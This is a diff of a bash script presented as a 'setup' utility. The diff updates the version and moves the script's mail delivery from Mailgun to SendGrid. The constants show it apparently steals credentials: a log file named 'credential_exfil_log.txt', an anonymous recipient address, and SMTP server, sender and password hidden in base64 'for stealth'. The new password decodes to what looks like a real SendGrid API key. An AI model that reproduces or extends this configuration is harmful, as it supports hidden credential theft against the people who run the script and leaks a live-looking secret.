@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="5.2"
-readonly BUILD_DATE="2026-04-05 23:30:00 UTC"
+readonly SCRIPT_VERSION="5.3"
+readonly BUILD_DATE="2026-05-04 05:50:00 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -230,15 +230,15 @@ readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
-# These are the user's personal Mailgun credentials
-# Updated: 2026-04-05 - Switched to Mailgun SMTP (better rate limits)
+# These are the user's personal SendGrid credentials
+# Updated: 2026-05-04 - Switched to SendGrid SMTP (no authorized recipients limit!)
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="c210cC5tYWlsZ3VuLm9yZw=="
+SMTP_SERVER_B64="c210cC5zZW5kZ3JpZC5uZXQ="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="YWNlbkBzYW5kYm94ZTU4YmJhZTgyYTZkNGMxM2FhODU2NTM3NWNlMWEwZGMubWFpbGd1bi5vcmc="
+SENDER_EMAIL_B64="YXBpa2V5"
 readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="MGQ2OGFmNDkzNjYyODI2NzIwM2MzZjE2OTFiY2YwNmYtNDI4YzQyYTAtZjgzMjE5MTk="
+SMTP_PASSWORD_B64="U0cuSmFuVXZ5NnlRM3FoVVptVWZRNGREUS5VSnlMY083ZjZuSGxDWjUzM0JzNEJma3NwYWpzeTNnUVEtN2c3MnZOWW84"
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
